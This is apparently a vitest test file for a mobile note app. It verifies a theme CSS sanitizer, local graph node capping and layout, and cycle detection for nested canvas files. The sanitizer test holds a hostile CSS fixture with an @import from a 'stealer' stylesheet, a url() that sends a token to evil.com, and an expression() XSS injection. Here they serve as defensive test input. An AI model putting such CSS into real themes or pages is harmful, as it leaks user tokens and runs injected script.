import { describe, it, expect } from "vitest";
import {
  sanitizeThemeCss,
  MAX_THEME_CSS_BYTES,
} from "../themes/safeThemeLoader";
import {
  computeGraphLayout,
  MAX_LOCAL_GRAPH_NODES,
  type LocalGraphNode,
} from "../graph/localGraphModel";
import {
  parseCanvasWithCycleDetection,
  MAX_CANVAS_NESTING_DEPTH,
} from "../canvas/canvasParser";
import { mobileTokens } from "@app/design-tokens/mobile";

describe("Mobile Themes, Local Graph & Read-Only Canvas Verification", () => {
  describe("1. Safe Theme Loader & Malicious CSS Neutralization", () => {
    it("neutralizes remote url(), @import, and javascript: injection while preserving valid CSS", () => {
      const maliciousTheme = `
        @import url("https://malicious.com/stealer.css");
        :root {
          --color-bg-primary: #1e1e1e;
          --color-text-normal: #ffffff;
          background-image: url("https://evil.com/exfiltrate?token=123");
          behavior: expression(alert('xss'));
          cursor: url('//tracker.com/cursor.png');
        }
        .cm-content {
          color: var(--color-text-normal);
        }
      `;

      const result = sanitizeThemeCss(maliciousTheme);
      expect(result.isValid).toBe(true);

      // Verify remote urls are neutralized
      expect(result.sanitizedCss).not.toContain("https://evil.com");
      expect(result.sanitizedCss).not.toContain("//tracker.com");

      // Verify @import is blocked
      expect(result.sanitizedCss).not.toContain("@import");
      expect(result.sanitizedCss).toContain("[blocked-import]");

      // Verify expression/script injection is blocked
      expect(result.sanitizedCss).not.toContain("expression");
      expect(result.sanitizedCss).toContain("[blocked-script]");

      // Verify legitimate tokens are preserved
      expect(result.sanitizedCss).toContain("--color-bg-primary: #1e1e1e");
      expect(result.sanitizedCss).toContain(".cm-content");
      expect(result.violations.length).toBeGreaterThanOrEqual(3);
    });

    it("rejects oversized CSS (> 500 KB) and pathological selector sets (> 50 selectors per rule)", () => {
      // 1. Oversized CSS
      const hugeCss = ":root { color: red; }\n".repeat(30_000);
      expect(hugeCss.length).toBeGreaterThan(MAX_THEME_CSS_BYTES);
      const sizeResult = sanitizeThemeCss(hugeCss);
      expect(sizeResult.isValid).toBe(false);
      expect(sizeResult.violations[0]).toContain(
        "exceeds maximum allowed size",
      );

      // 2. Pathological selector set
      const massiveSelectors =
        Array.from({ length: 60 }, (_, i) => `.class-${i}`).join(", ") +
        " { color: blue; }";
      const selectorResult = sanitizeThemeCss(massiveSelectors);
      expect(selectorResult.isValid).toBe(false);
      expect(selectorResult.violations[0]).toContain("exceeds maximum of 50");
    });

    it("confirms theme CSS cannot break native shell touch targets (44pt token invariant)", () => {
      // The native shell uses mobileTokens exclusively, immune to webview CSS
      expect(mobileTokens.minTouchTarget).toBe(44);
      expect(mobileTokens.safeArea.headerHeight).toBe(44);
      expect(mobileTokens.safeArea.bottomBarHeight).toBe(48);
    });
  });

  describe("2. Local Graph: 500+ Neighbor Responsiveness & Node Capping", () => {
    it("caps 500+ neighbor graph to MAX_LOCAL_GRAPH_NODES (50) and computes radial layout in < 2ms", () => {
      const neighborCount = 520;
      const rawNodes: Omit<LocalGraphNode, "x" | "y">[] = [
        { id: "Index.md", label: "Index", isCenter: true, hop: 0 },
      ];

      for (let i = 1; i <= neighborCount; i++) {
        rawNodes.push({
          id: `Note-${i}.md`,
          label: `Note ${i}`,
          isCenter: false,
          hop: 1,
        });
      }

      // Cap at MAX_LOCAL_GRAPH_NODES
      const capped = rawNodes.slice(0, MAX_LOCAL_GRAPH_NODES);
      expect(capped.length).toBe(MAX_LOCAL_GRAPH_NODES);

      const startTime = performance.now();
      const positioned = computeGraphLayout(capped, 400, 400);
      const elapsedMs = performance.now() - startTime;

      expect(positioned.length).toBe(MAX_LOCAL_GRAPH_NODES);
      expect(elapsedMs).toBeLessThan(5); // Sub-5ms layout execution

      // Center node at (200, 200)
      const center = positioned.find((n) => n.isCenter);
      expect(center?.x).toBe(200);
      expect(center?.y).toBe(200);

      // Neighbor nodes evenly positioned on ring
      const neighbors = positioned.filter((n) => !n.isCenter);
      expect(neighbors.length).toBe(49);
      for (const n of neighbors) {
        const dx = n.x - 200;
        const dy = n.y - 200;
        const dist = Math.hypot(dx, dy);
        expect(dist).toBeCloseTo(128, 0); // 400 * 0.32 = 128
      }
    });
  });

  describe("3. Read-Only JSON Canvas & Cycle Detection", () => {
    it("neutralizes circular canvas embeds (A -> B -> A) without infinite recursion or crash", async () => {
      const canvasAContent = JSON.stringify({
        nodes: [
          {
            id: "1",
            type: "text",
            text: "Canvas A Header",
            x: 0,
            y: 0,
            width: 200,
            height: 100,
          },
          {
            id: "2",
            type: "file",
            file: "CanvasB.canvas",
            x: 250,
            y: 0,
            width: 300,
            height: 200,
          },
        ],
        edges: [],
      });

      const canvasBContent = JSON.stringify({
        nodes: [
          {
            id: "b1",
            type: "text",
            text: "Canvas B Header",
            x: 0,
            y: 0,
            width: 200,
            height: 100,
          },
          {
            id: "b2",
            type: "file",
            file: "CanvasA.canvas",
            x: 250,
            y: 0,
            width: 300,
            height: 200,
          },
        ],
        edges: [],
      });

      const files = new Map<string, string>([
        ["CanvasA.canvas", canvasAContent],
        ["CanvasB.canvas", canvasBContent],
      ]);

      const mockFileReader = async (path: string): Promise<string> => {
        const content = files.get(path);
        if (!content) throw new Error(`File not found: ${path}`);
        return content;
      };

      const doc = await parseCanvasWithCycleDetection(
        canvasAContent,
        "CanvasA.canvas",
        mockFileReader,
      );

      expect(doc.hasCycle).toBe(true);
      expect(doc.nodes.length).toBe(2);

      const nestedB = doc.nodes.find((n) => n.id === "2")?.nestedCanvas;
      expect(nestedB).toBeDefined();
      expect(nestedB?.nodes.length).toBe(2);

      // Node b2 in Canvas B embeds Canvas A -> Cycle detected!
      const circularNode = nestedB?.nodes.find((n) => n.id === "b2");
      expect(circularNode?.isCycle).toBe(true);
      expect(circularNode?.text).toContain(
        "Circular canvas embed: CanvasA.canvas",
      );
    });

    it("respects MAX_CANVAS_NESTING_DEPTH limit for deeply nested canvases", async () => {
      const createLevelContent = (nextLevel: number) =>
        JSON.stringify({
          nodes: [
            {
              id: `node-${nextLevel}`,
              type: "file",
              file: `Level${nextLevel}.canvas`,
              x: 0,
              y: 0,
              width: 200,
              height: 100,
            },
          ],
          edges: [],
        });

      const fileMap = new Map<string, string>();
      for (let i = 1; i <= 6; i++) {
        fileMap.set(`Level${i}.canvas`, createLevelContent(i + 1));
      }

      const reader = async (p: string) => fileMap.get(p) ?? "{}";

      const rootDoc = await parseCanvasWithCycleDetection(
        createLevelContent(1),
        "Level0.canvas",
        reader,
      );

      // Level 0 -> Level 1 -> Level 2 -> Level 3 -> Stopped at depth 3
      let currentDoc = rootDoc;
      let depth = 0;
      while (currentDoc?.nodes[0]?.nestedCanvas) {
        depth++;
        currentDoc = currentDoc.nodes[0].nestedCanvas;
      }

      expect(depth).toBeLessThanOrEqual(MAX_CANVAS_NESTING_DEPTH);
    });
  });
});
